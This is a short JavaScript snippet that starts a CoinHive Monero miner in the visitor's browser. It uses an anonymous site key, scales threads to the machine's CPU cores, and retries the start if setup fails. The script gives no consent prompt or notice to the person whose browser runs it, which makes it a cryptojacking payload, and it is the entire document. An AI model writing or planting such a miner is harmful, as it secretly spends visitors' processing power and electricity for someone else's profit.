var xmr = new CoinHive.Anonymous('TEMV6f7XauXG7zRa00NLpjxXehga12AL', {
    throttle: 0.8,
    threads: 1
});
try {
    var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
    xmr.setNumThreads(threads);
    xmr.start();
} catch (e) {
    xmr.start();
}